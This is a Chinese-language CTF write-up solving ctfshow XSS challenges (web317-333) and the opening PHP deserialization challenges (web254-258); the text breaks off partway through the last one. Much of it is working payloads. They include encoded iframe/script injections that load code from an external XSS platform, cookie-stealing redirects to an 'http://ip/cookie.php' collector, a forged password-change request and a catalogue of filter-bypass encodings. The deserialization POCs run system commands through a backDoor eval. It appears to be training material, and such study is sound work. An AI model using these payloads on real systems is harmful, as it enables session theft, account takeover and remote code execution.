<p><code>&lt;iframe WIDTH=0 HEIGHT=0 srcdoc=。。。。。。。。。。&amp;#60;&amp;#115;&amp;#67;&amp;#82;&amp;#105;&amp;#80;&amp;#116;&amp;#32;&amp;#115;&amp;#82;&amp;#67;&amp;#61;&amp;#34;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#120;&amp;#115;&amp;#115;&amp;#121;&amp;#101;&amp;#46;&amp;#99;&amp;#111;&amp;#109;&amp;#47;&amp;#120;&amp;#51;&amp;#84;&amp;#119;&amp;#34;&amp;#62;&amp;#60;&amp;#47;&amp;#115;&amp;#67;&amp;#114;&amp;#73;&amp;#112;&amp;#84;&amp;#62;&gt;</code></p>
</blockquote>
<p>得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/364adb6edf98f67fb4a2910e2f0b0362.png?x-oss-process=hzy" alt="image-20220325120033561"></p>
<blockquote>
<iframe> - HTML（超文本标记语言） | MDN (mozilla.org)
</iframe></blockquote>
<h1 id="web318">web318</h1>
<p>这道题增加了过滤，查询得到这道题过滤了img标签</p>
<blockquote>
<p>img标签也被过滤了，可以用body标签，这个标签不容易被ban</p>
<p><code>&lt;body onload=alert(0)&gt;&lt;/body&gt;</code>，成功回显。</p>
</blockquote>
<ul>
<li>
<blockquote>
<p>过滤img，用xss平台的实体十六进制编码</p>
<p><code>&lt;iframe WIDTH=0 HEIGHT=0 srcdoc=。。。。。。。。。。&amp;#x3C;&amp;#x73;&amp;#x43;&amp;#x52;&amp;#x69;&amp;#x50;&amp;#x74;&amp;#x20;&amp;#x73;&amp;#x52;&amp;#x43;&amp;#x3D;&amp;#x22;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3A;&amp;#x2F;&amp;#x2F;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x79;&amp;#x65;&amp;#x2E;&amp;#x63;&amp;#x6F;&amp;#x6D;&amp;#x2F;&amp;#x71;&amp;#x79;&amp;#x52;&amp;#x43;&amp;#x22;&amp;#x3E;&amp;#x3C;&amp;#x2F;&amp;#x73;&amp;#x43;&amp;#x72;&amp;#x49;&amp;#x70;&amp;#x54;&amp;#x3E;&gt;</code></p>
</blockquote>
</li>
</ul>
<h1 id="web319">web319</h1>
<blockquote>
<p>这道题同上，没用过滤iframe</p>
<p><code>&lt;iframe WIDTH=0 HEIGHT=0 srcdoc=。。。。。。。。。。&amp;#60;&amp;#115;&amp;#67;&amp;#82;&amp;#105;&amp;#80;&amp;#116;&amp;#32;&amp;#115;&amp;#82;&amp;#67;&amp;#61;&amp;#34;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#120;&amp;#115;&amp;#115;&amp;#121;&amp;#101;&amp;#46;&amp;#99;&amp;#111;&amp;#109;&amp;#47;&amp;#113;&amp;#121;&amp;#82;&amp;#67;&amp;#34;&amp;#62;&amp;#60;&amp;#47;&amp;#115;&amp;#67;&amp;#114;&amp;#73;&amp;#112;&amp;#84;&amp;#62;&gt;</code></p>
</blockquote>
<h1 id="web320">web320</h1>
<blockquote>
<blockquote>
<ul>
<li>过滤了空格可以换%09制表符或者/来代替</li>
</ul>
<p><code>&lt;iframe/WIDTH=0/HEIGHT=0/srcdoc=。。。。。。。。。。&amp;#60;&amp;#115;&amp;#67;&amp;#82;&amp;#105;&amp;#80;&amp;#116;&amp;#32;&amp;#115;&amp;#82;&amp;#67;&amp;#61;&amp;#34;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#120;&amp;#115;&amp;#115;&amp;#121;&amp;#101;&amp;#46;&amp;#99;&amp;#111;&amp;#109;&amp;#47;&amp;#113;&amp;#121;&amp;#82;&amp;#67;&amp;#34;&amp;#62;&amp;#60;&amp;#47;&amp;#115;&amp;#67;&amp;#114;&amp;#73;&amp;#112;&amp;#84;&amp;#62;&gt;</code></p>
</blockquote>
<pre><code class="hljs plaintext">&lt;body/onload=document.location=&#x27;http://ip/cookie.php?cookie=&#x27;+document.cookie;&gt;</code></pre>
<pre><code class="hljs plaintext">&lt;body   onload=document.location=&#x27;http://ip/&#x27;+document.cookie;&gt;</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/862b2de7572eb591f2925be7acdf5688.png?x-oss-process=hzy" alt="image-20220402122852006"></p>
</blockquote>
<h1 id="web321-326">web321-326</h1>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/d38a61617689373d8b27d09d6a127f93.png?x-oss-process=hzy" alt="image-20220402123046302"></p>
<p>过滤的不影响payload，通杀！</p>
<h1 id="web327">web327</h1>
<p>储存型xss</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/a4ff8789c836a193375282a828f5e542.png?x-oss-process=hzy" alt="image-20220402123835826"></p>
<p>还用上一题的方法还是可！</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/05f88a3ad1f645ab67ca2881171808f6.png?x-oss-process=hzy" alt="image-20220402124001064"></p>
<h1 id="web328">web328</h1>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/e2446c8487517bff1d380ac7d53f7e47.png?x-oss-process=hzy" alt="image-20220402124148083"></p>
<blockquote>
<p>先注册一个用户</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207191449031.png?x-oss-process=hzy" alt="image-20220719144948985"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/d6009a561b7aaad7007a941b6fca52f2.png?x-oss-process=hzy" alt="image-20220402124657195"></p>
</blockquote>
<p>盗取到cookie！</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/ba3b8ac3973c0c9f96199fbd13e2c42c.png?x-oss-process=hzy" alt="image-20220402125657138"></p>
<p>替换cookie，成为admin</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/d5d52dae67f0f54ee5f84a3feb62b848.png?x-oss-process=hzy" alt="image-20220402125734783"></p>
<h1 id="web329">web329</h1>
<blockquote>
<p>查资料发现从这题开始，cookie都是短时的，截获的的cookie都会失效！</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207191449392.png?x-oss-process=hzy" alt="image-20220719144910338"></p>
</blockquote>
<p>可以看到截获的cookie在不断变化，同时都是无法正常使用的</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/365b3c04fcf5491f8e331c74081b191e.png?x-oss-process=hzy" alt="image-20220402130147887"></p>
<p>最后神奇的出来了cookie!</p>
<h1 id="web330">web330</h1>
<blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/e35cf9b56fd28cf752cecc5fe25d78e2.png?x-oss-process=hzy" alt="image-20220402130326741"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207191446704.png?x-oss-process=hzy" alt="image-20220719144602659"></p>
<p>使用bp抓包修改密码</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/07ac1f35a2c605d958b13c901a9cef74.png?x-oss-process=hzy" alt="image-20220402130743241"></p>
<p>进入admin，得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/656dd6ad6a090a79483287a1605b8cc9.png?x-oss-process=hzy" alt="image-20220402131335454"></p>
<h1 id="web331">web331</h1>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/f265baa2214e234886bc617388f5e68d.png?x-oss-process=hzy" alt="image-20220402131620821"></p>
<p>这里发现变成了post请求，用window.open肯定不行了</p>
<p>查一下javascript如何发送Http请求</p>
<pre><code class="hljs plaintext">var httpRequest = new XMLHttpRequest();//第一步：创建需要的对象
httpRequest.open(&#x27;POST&#x27;, &#x27;url&#x27;, true); //第二步：打开连接
httpRequest.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);//设置请求头 注：post方式必须设置请求头（在建立连接后设置请求头）
httpRequest.send(&#x27;name=teswe&amp;ee=ef&#x27;);//发送请求 将情头体写在send中
/**
 * 获取数据后的处理程序
 */
httpRequest.onreadystatechange = function () &#123;//请求后的回调接口，可将请求成功后要执行的程序写在其中
    if (httpRequest.readyState == 4 &amp;&amp; httpRequest.status == 200) &#123;//验证请求是否发送成功
        var json = httpRequest.responseText;//获取到服务端返回的数据
        console.log(json);
    &#125;
&#125;;</code></pre>
<p>用这个，在注册页payload</p>
<script>var httpRequest = new XMLHttpRequest();httpRequest.open('POST', 'http://127.0.0.1/api/change.php', true);httpRequest.setRequestHeader("Content-type","application/x-www-form-urlencoded");httpRequest.send('p=123456');</script>
<p>登录admin即可!</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/3ce9ee34e91d98eee2dac1026d9cba94.png?x-oss-process=hzy" alt="image-20220402132814339"></p>
<h1 id="web332">web332</h1>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/2ffd88d7f28cdfca897e5cc2282bd8a6.png?x-oss-process=hzy" alt="image-20220402132917124"></p>
<p>注册用户，然后给admin转账-100000也就是自己多了100000</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/f5f3285a5a58cfcbbe45f3baadd6bd29.png?x-oss-process=hzy" alt="image-20220402133010578"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/881b517a931ceacc29117d8d1165f71f.png?x-oss-process=hzy" alt="image-20220402133018491"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/4d6ab59605d1ffa29831747853659331.png?x-oss-process=hzy" alt="image-20220402133025907"></p>
<h1 id="web333">web333</h1>
<p>这道题是不能向其他账户转账的，只能向自己转账，且只能转低于自己现有钱的数目，比如现在有5块，那么最多只能转5块，接下来的就慢慢跑到10000即可，用burp可以跑：</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/a5ac34557fc4c708702df1722816f311.png?x-oss-process=hzy" alt="image-20220402133425766"></p>
<p>写个脚本也可以</p>
<pre><code class="hljs plaintext">import requests
import re
import time
x=5
url=&quot;http://93a2a39e-623a-4cc6-bea3-6e43db483fd7.challenge.ctf.show/api/amount.php&quot;
url2=&quot;http://93a2a39e-623a-4cc6-bea3-6e43db483fd7.challenge.ctf.show/api/getFlag.php&quot;
headers=&#123;&#x27;Cookie&#x27;:&#x27;PHPSESSID=g4fohb8r0onc7p66qf4oasoh0l&#x27;&#125;  #自己登录后的sessionid
while True:
   print(x)
   t=x-1
   data=&#123;
   &#x27;u&#x27;:&#x27;000&#x27;, #注册的用户名
   &#x27;a&#x27;:str(t)
   &#125;
   r=requests.post(url,headers=headers,data=data)
   print(r.text)
   if(x&gt;10000):
      r2=requests.get(url2,headers=headers)
      print(r2.text)
      break
   x+=t
</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/7a88483b59f99f8ba8767096f2a6f620.png?x-oss-process=hzy" alt="image-20220402134524351"></p>
<h1 id="总结">总结</h1>
<h2 id="无任何过滤情况下的xss">无任何过滤情况下的XSS</h2>
<p>当没有过滤发生时，可以的XSSpayload就太多了，包括但不限于：</p>
<pre><code class="hljs javascript">&lt;script&gt;：
&lt;script&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>);&lt;/script&gt;

&lt;body&gt;：
&lt;body onload=<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>);&gt;

&lt;img&gt;：
&lt;img src=<span class="hljs-string">&#x27;&#x27;</span> onerror=<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>);&gt;

&lt;svg&gt;：
&lt;svg onload=<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>);&gt;

&lt;iframe&gt;：
&lt;iframe onload=alert(1);&gt;&lt;/iframe&gt;

&lt;video&gt;：
&lt;video&gt;&lt;source onerror=alert(1);&gt;

&lt;audio&gt;：
&lt;audio src=&#x27;&#x27; onerror=alert(1);&gt;</code></pre>
<h2 id="过滤空格的情况">过滤空格的情况</h2>
<p>当发现题目过滤了空格的时候，就可以用<code>/</code>去绕过空格<br>
比如：</p>
<pre><code class="hljs javascript">&lt;body/onload=<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>);&gt;</code></pre>
<h2 id="过滤了关键字">过滤了关键字</h2>
<h2 id="大小写绕过">大小写绕过</h2>
<p>当过滤了像img这样的关键字时，可以尝试去用大小写去绕过：</p>
<pre><code class="hljs javascript">&lt;<span class="hljs-title class_">ImG</span> sRc=<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-title class_">OnErroR</span>=<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>);&gt;</code></pre>
<h2 id="双写绕过">双写绕过</h2>
<p>或者可以用双写绕过：（当waf是只匹配一次，且替换为空时可以双写）</p>
<pre><code class="hljs javascript">&lt;imimgg srsrcc=<span class="hljs-string">&#x27;&#x27;</span> onerror=<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>);&gt;</code></pre>
<h2 id="拼接绕过">拼接绕过</h2>
<p>也可以用eval或者top来进行拼接</p>
<pre><code class="hljs javascript">&lt;img src=<span class="hljs-string">&#x27;&#x27;</span> onerror=<span class="hljs-string">&quot;a=&#x27;aler&#x27;;b=&#x27;t&#x27;;c=&#x27;(1);&#x27;;eval(a+b+c)&quot;</span>&gt;

<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">top[</span>&quot;<span class="hljs-attr">ale</span>&quot;+&quot;<span class="hljs-attr">rt</span>&quot;](<span class="hljs-attr">1</span>);&gt;</span></span></code></pre>
<h2 id="编码绕过">编码绕过：</h2>
<blockquote>
<p>可以用unicode编码绕过</p>
<pre><code class="hljs javascript">&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-string">&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;</span>&gt;

<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;eval(&#x27;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#x27;)&quot;</span>&gt;</span></span></code></pre>
<p>url编码</p>
<pre><code class="hljs javascript">&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-string">&quot;eval(unescape(&#x27;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#x27;))&quot;</span>&gt;
<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span></code></pre>
<p>Ascii码绕过</p>
<pre><code class="hljs javascript">&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-string">&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;</span>&gt;</code></pre>
<p>hex绕过</p>
<pre><code class="hljs javascript">&lt;img src=x onerror=<span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&#x27;</span>)&gt;</code></pre>
<p>八进制绕过</p>
<pre><code class="hljs javascript">&lt;img src=x onerror=<span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;\170\163\163&#x27;</span>)&gt;</code></pre>
<p>base64绕过</p>
<pre><code class="hljs javascript">&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-string">&quot;eval(atob(&#x27;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#x27;))&quot;</span>&gt;
<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;</span>&gt;</span></span></code></pre>
<blockquote>
<p>对于xss中用服务器查看日志也做一下记录</p>
<p>服务器中用到的apache，刚开始开启apache</p>
<p><code>service apache2 start</code></p>
<p><code>cd /var/log/apache2</code></p>
<p>日志一般都在access.log里面</p>
<p>对于过滤不严或者没有过滤的直接用</p>
</blockquote>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207191445301.png?x-oss-process=hzy" alt="image-20220719144511252"></p>
<blockquote>
<blockquote>
<p>即可进行监听并查看日志得到关键信息</p>
</blockquote>
</blockquote>
<p>参考：</p>
<p><a href="http://blog.o3ev.cn/yy/224#menu_index_9">通过CTFSHOW来粗略学习XSS - o3Ev的小家</a></p>
<p>[Y0ng的博客 (yongsheng.site)](<a href="http://www.yongsheng.site/2021/04/20/ctfshow">http://www.yongsheng.site/2021/04/20/ctfshow</a> web入门(xss)/)</p>
<p><a href="https://y4tacker.blog.csdn.net/article/details/111568030">CTFSHOW]XSS入门(佛系记录)_Y4tacker的博客-CSDN博客_ctfshow web入门xss</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>ctfshow</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFSHOW反序列化</title>
    <url>/2022/04/15/ctfshow%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<p><strong>反序列化刷题</strong></p>
<span id="more"></span>
<h1 id="前置">前置</h1>
<p>常见魔法函数</p>
<pre><code class="hljs plaintext">__sleep() //执行serialize()时，先会调用这个函数
__wakeup() //将在反序列化之后立即调用（当反序列化时变量个数与实际不符时绕过）
__construct() //当对象被创建时，会触发进行初始化
__destruct() //对象被销毁时触发
__toString()： //当一个对象被当作字符串使用时触发
__call() //在对象上下文中调用不可访问的方法时触发
__callStatic() //在静态上下文中调用不可访问的方法时触发
__get() //获得一个类的成员变量时调用,用于从不可访问的属性读取数据（不可访问的属性包括：1.属性是私有型。2.类中不存在的成员变量）
__set() //用于将数据写入不可访问的属性
__isset() //在不可访问的属性上调用isset()或empty()触发
__unset() //在不可访问的属性上使用unset()时触发
__toString() //把类当作字符串使用时触发
__invoke() //当尝试以调用函数的方式调用一个对象时</code></pre>
<h1 id="web254">web254</h1>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/cb76207a9d72b43f3d812ae8e40e5b2f.png?x-oss-process=hzy" alt="image-20220323213133168"></p>
<pre><code class="hljs plaintext">&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 19:29:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);
include(&#x27;flag.php&#x27;);

class ctfShowUser&#123;
    public $username=&#x27;xxxxxx&#x27;;
    public $password=&#x27;xxxxxx&#x27;;
    public $isVip=false;

    public function checkVip()&#123;
        return $this-&gt;isVip;
    &#125;
    public function login($u,$p)&#123;
        if($this-&gt;username===$u&amp;&amp;$this-&gt;password===$p)&#123;
            $this-&gt;isVip=true;
        &#125;
        return $this-&gt;isVip;
    &#125;
    public function vipOneKeyGetFlag()&#123;
        if($this-&gt;isVip)&#123;
            global $flag;
            echo &quot;your flag is &quot;.$flag;
        &#125;else&#123;
            echo &quot;no vip, no flag&quot;;
        &#125;
    &#125;
&#125;

$username=$_GET[&#x27;username&#x27;];
$password=$_GET[&#x27;password&#x27;];

if(isset($username) &amp;&amp; isset($password))&#123;
    $user = new ctfShowUser();
    if($user-&gt;login($username,$password))&#123;
        if($user-&gt;checkVip())&#123;
            $user-&gt;vipOneKeyGetFlag();
        &#125;
    &#125;else&#123;
        echo &quot;no vip,no flag&quot;;
    &#125;
&#125;</code></pre>
<p>审计一下发现只需要让username和password等于所给的值即可！</p>
<blockquote>
<p>?username=xxxxxx&amp;password=xxxxxx</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/506fc615db70dad57a9c72ec6f65bf5e.png?x-oss-process=hzy" alt="image-20220323213621159"></p>
<h1 id="web255">web255</h1>
<pre><code class="hljs plaintext">&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 19:29:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);
include(&#x27;flag.php&#x27;);

class ctfShowUser&#123;
    public $username=&#x27;xxxxxx&#x27;;
    public $password=&#x27;xxxxxx&#x27;;
    public $isVip=false;

    public function checkVip()&#123;
        return $this-&gt;isVip;
    &#125;
    public function login($u,$p)&#123;
        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;
    &#125;
    public function vipOneKeyGetFlag()&#123;
        if($this-&gt;isVip)&#123;
            global $flag;
            echo &quot;your flag is &quot;.$flag;
        &#125;else&#123;
            echo &quot;no vip, no flag&quot;;
        &#125;
    &#125;
&#125;

$username=$_GET[&#x27;username&#x27;];
$password=$_GET[&#x27;password&#x27;];

if(isset($username) &amp;&amp; isset($password))&#123;
    $user = unserialize($_COOKIE[&#x27;user&#x27;]);    
    if($user-&gt;login($username,$password))&#123;
        if($user-&gt;checkVip())&#123;
            $user-&gt;vipOneKeyGetFlag();
        &#125;
    &#125;else&#123;
        echo &quot;no vip,no flag&quot;;
    &#125;
&#125;</code></pre>
<p>cookie处有反序列化点，传进去将isvip改成true即可</p>
<pre><code class="hljs plaintext">&lt;?php


error_reporting(0);
highlight_file(__FILE__);
include(&#x27;flag.php&#x27;);

class ctfShowUser&#123;
    public $username=&#x27;xxxxxx&#x27;;
    public $password=&#x27;xxxxxx&#x27;;
    public $isVip=true;

&#125;

$h = new ctfShowUser();
#echo serialize($h);
echo urlencode(serialize($h));
//O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D
//注:cookie这种传参需要先url编码</code></pre>
<img src="https://img.hzy2003628.top/image-20230729160133306.png" alt="image-20230729160133306" style="zoom:200%;">
<p>ctfshow{b5aa6a66-4b5b-429f-a2f3-a7361fb435b1}</p>
<h1 id="web256">web256</h1>
<pre><code class="hljs plaintext">&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 19:29:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);
include(&#x27;flag.php&#x27;);

class ctfShowUser&#123;
    public $username=&#x27;xxxxxx&#x27;;
    public $password=&#x27;xxxxxx&#x27;;
    public $isVip=false;

    public function checkVip()&#123;
        return $this-&gt;isVip;
    &#125;
    public function login($u,$p)&#123;
        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;
    &#125;
    public function vipOneKeyGetFlag()&#123;
        if($this-&gt;isVip)&#123;
            global $flag;
            if($this-&gt;username!==$this-&gt;password)&#123;
                    echo &quot;your flag is &quot;.$flag;
              &#125;
        &#125;else&#123;
            echo &quot;no vip, no flag&quot;;
        &#125;
    &#125;
&#125;

$username=$_GET[&#x27;username&#x27;];
$password=$_GET[&#x27;password&#x27;];

if(isset($username) &amp;&amp; isset($password))&#123;
    $user = unserialize($_COOKIE[&#x27;user&#x27;]);    
    if($user-&gt;login($username,$password))&#123;
        if($user-&gt;checkVip())&#123;
            $user-&gt;vipOneKeyGetFlag();
        &#125;
    &#125;else&#123;
        echo &quot;no vip,no flag&quot;;
    &#125;
&#125;</code></pre>
<p>这个和一道题目不同的点就是传进去的username和password的值不能相同</p>
<p>poc如下</p>
<pre><code class="hljs plaintext">&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 19:29:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);
include(&#x27;flag.php&#x27;);

class ctfShowUser&#123;
    public $username=&#x27;1&#x27;;
    public $password=&#x27;2&#x27;;
    public $isVip=true;



&#125;
$h = new ctfShowUser();
echo urlencode(serialize($h));
//O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A1%3A%221%22%3Bs%3A8%3A%22password%22%3Bs%3A1%3A%222%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</code></pre>
<img src="https://img.hzy2003628.top/image-20230729162007602.png" alt="image-20230729162007602" style="zoom:200%;">
<p>ctfshow{59b86e9e-3656-4756-ad73-bdd2b7e3be10}</p>
<h1 id="web257">web257</h1>
<pre><code class="hljs plaintext">&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 20:33:07
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);

class ctfShowUser&#123;
    private $username=&#x27;xxxxxx&#x27;;
    private $password=&#x27;xxxxxx&#x27;;
    private $isVip=false;
    private $class = &#x27;info&#x27;;

    public function __construct()&#123;
        $this-&gt;class=new info();
    &#125;
    public function login($u,$p)&#123;
        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;
    &#125;
    public function __destruct()&#123;
        $this-&gt;class-&gt;getInfo();
    &#125;

&#125;

class info&#123;
    private $user=&#x27;xxxxxx&#x27;;
    public function getInfo()&#123;
        return $this-&gt;user;
    &#125;
&#125;

class backDoor&#123;
    private $code;
    public function getInfo()&#123;
        eval($this-&gt;code);
    &#125;
&#125;

$username=$_GET[&#x27;username&#x27;];
$password=$_GET[&#x27;password&#x27;];

if(isset($username) &amp;&amp; isset($password))&#123;
    $user = unserialize($_COOKIE[&#x27;user&#x27;]);
    $user-&gt;login($username,$password);
&#125;</code></pre>
<p>和上题差别在于变量为私有属性了，这个需要在序列化之后的对象和值两边加上%00</p>
<p>poc如下</p>
<pre><code class="hljs plaintext">&lt;?php
error_reporting(0);
highlight_file(__FILE__);

class ctfShowUser&#123;
    private $class = &#x27;backDoor&#x27;;

    public function __construct()&#123;
        $this-&gt;class=new backDoor();
    &#125;
    public function login($u,$p)&#123;
        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;
    &#125;
    public function __destruct()&#123;
        $this-&gt;class-&gt;getInfo();
    &#125;

&#125;

class info&#123;
    private $user=&#x27;xxxxxx&#x27;;
    public function getInfo()&#123;
        return $this-&gt;user;
    &#125;
&#125;

class backDoor&#123;
    private $code=&quot;system(&#x27;ls&#x27;);&quot;;
    public function getInfo()&#123;
        eval($this-&gt;code);    //door
    &#125;
&#125;


$h = new ctfShowUser();
echo serialize($h);
echo urlencode(serialize($h));

//O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A13%3A%22system%28%27ls%27%29%3B%22%3B%7D%7D
//O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A16%3A%22system%28%27nl+f%2A%27%29%3B%22%3B%7D%7D</code></pre>
<img src="https://img.hzy2003628.top/image-20230729163147214.png" alt="image-20230729163147214" style="zoom:200%;">
<p>ctfshow{e32175cb-1c54-4539-8e7d-10ad4bf45208}</p>
<h1 id="web258">web258</h1>
<pre><code class="hljs plaintext">&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 21:38:56
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);

class ctfShowUser&#123;
    public $username=&#x27;xxxxxx&#x27;;
    public $password=&#x27;xxxxxx&#x27;;
    public $isVip=false;
    public $class = &#x27;info&#x27;;

    public function __construct()&#123;
        $this-&gt;class=new info();
    &#125;
    public function login($u,$p)&#123;
        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;
    &#125;
    public function __destruct()&#123;
        $this-&gt;class-&gt;getInfo();
    &#125;

&#125;

class info&#123;
    public $user=&#x27;xxxxxx&#x27;;
    public function getInfo()&#123;
        return $this-&gt;user;
    &#125;
&#125;

class backDoor&#123;
    public $code;
    public function getInfo()&#123;
        eval($this-&gt;code);
    &#125;
&#125;

$username=$_GET[&#x27;username&#x27;];
$password=$_GET[&#x27;password&#x27;];

if(isset($username) &amp;&amp; isset($password))&#123;
